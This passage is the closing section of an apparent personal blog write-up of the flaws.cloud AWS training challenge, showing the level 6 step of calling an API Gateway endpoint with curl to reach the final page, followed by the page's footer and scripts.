+<p>This tells us that stage name is Prod and hence now we can navigate to - <a href="https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6">https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6</a> to execude the lambda function.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>fumenoid㉿kali<span class="o">)</span>-[~/Desktop/Fumenoid/Cloud]
+└─<span class="nv">$ </span>curl https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6  
+<span class="s2">"Go to http://theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud/d730aa2b/"</span> </code></pre></figure>
+
+<h4 id="level-6-summarized">Level 6 summarized</h4>
+
+<p><a href="/assets/documentation/Pasted image 20211023122744-c618e64ebf76edb9232d03645de312918dc24b5e1c08dec2eb5869d744ad5d2c.png">
+  <img src="/assets/documentation/Pasted image 20211023122744-c618e64ebf76edb9232d03645de312918dc24b5e1c08dec2eb5869d744ad5d2c.png" alt="Level 6" class="zooming" data-rjs="/assets/documentation/Pasted image 20211023122744-c618e64ebf76edb9232d03645de312918dc24b5e1c08dec2eb5869d744ad5d2c.png" data-zooming-width="1920" data-zooming-height="816" />
+</a></p>
+
+<h6 id="hope-you-learned-something-new-if-you-face-any-issues--have-any-query-feel-free-to-contact-me-on-social-media">Hope you learned something new, if you face any issues / have any query, feel free to contact me on social media.</h6>
+
+
+          </div>
+          <div class="article-share">
+            
+            
+            <a href="https://twitter.com/intent/tweet?url=https://fumenoid.github.io/posts/cloud-security-aws-flaws-1&via=fumenoid&text=Cloud Security - AWS - Flaws 1 : My notes of Flaws[flaws.cloud] which is focused on AWS." title="Share on Twitter" rel="noreferrer noopener" target="_blank">
+              <svg viewBox="0 0 512 512"><path d="M492 109.5c-17.4 7.7-36 12.9-55.6 15.3 20-12 35.4-31 42.6-53.6 -18.7 11.1-39.4 19.2-61.5 23.5C399.8 75.8 374.6 64 346.8 64c-53.5 0-96.8 43.4-96.8 96.9 0 7.6 0.8 15 2.5 22.1 -80.5-4-151.9-42.6-199.6-101.3 -8.3 14.3-13.1 31-13.1 48.7 0 33.6 17.2 63.3 43.2 80.7C67 210.7 52 206.3 39 199c0 0.4 0 0.8 0 1.2 0 47 33.4 86.1 77.7 95 -8.1 2.2-16.7 3.4-25.5 3.4 -6.2 0-12.3-0.6-18.2-1.8 12.3 38.5 48.1 66.5 90.5 67.3 -33.1 26-74.9 41.5-120.3 41.5 -7.8 0-15.5-0.5-23.1-1.4C62.8 432 113.7 448 168.3 448 346.6 448 444 300.3 444 172.2c0-4.2-0.1-8.4-0.3-12.5C462.6 146 479 129 492 109.5z"/></svg>
+            </a>
+            <a href="https://www.facebook.com/sharer/sharer.php?u=https://fumenoid.github.io/posts/cloud-security-aws-flaws-1" title="Share on Facebook" rel="noreferrer noopener" target="_blank">
+              <svg viewBox="0 0 512 512"><path d="M288 192v-38.1c0-17.2 3.8-25.9 30.5-25.9H352V64h-55.9c-68.5 0-91.1 31.4-91.1 85.3V192h-45v64h45v192h83V256h56.4l7.6-64H288z"/></svg>
+            </a>
+          </div>
+
+          
+        </article>
+        <footer class="footer scrollappear">
+    <script type="text/javascript" src="https://cdnjs.buymeacoffee.com/1.0.0/button.prod.min.js" data-name="bmc-button" data-slug="fumenoid" data-color="#FFDD00" data-emoji=""  data-font="Comic" data-text="Buy me a coffee" data-outline-color="#000000" data-font-color="#000000" data-coffee-color="#ffffff" ></script>
+</footer>
+
+      </div>
+    </div>
+  </main>
+  
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-172959519-1"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'UA-172959519-1');
+  </script>
+
+
+<script src="/assets/vendor-130c9c254effc51f3283620bc635851da7b99c20901216948f11ba72ee13317f.js" type="text/javascript"></script>
+
+
+  <script src="/assets/webfonts-96493456d319d1bf419afdf8701552d4d486fee6afd304897d4fd81eb4e0cc0b.js" type="text/javascript"></script>
+
+
+
+  <script src="/assets/scrollappear-e2da8ea567e418637e31266cc5302126eaa79f62a2273739086358b589a89ee6.js" type="text/javascript"></script>
+
+
+<script src="/assets/application-cfde13ac81ddaf4351b2e739603e2baf688d0fcc9aba613fe62bbb1c7b037fb9.js" type="text/javascript"></script>
+
+
+</body>
+</html>
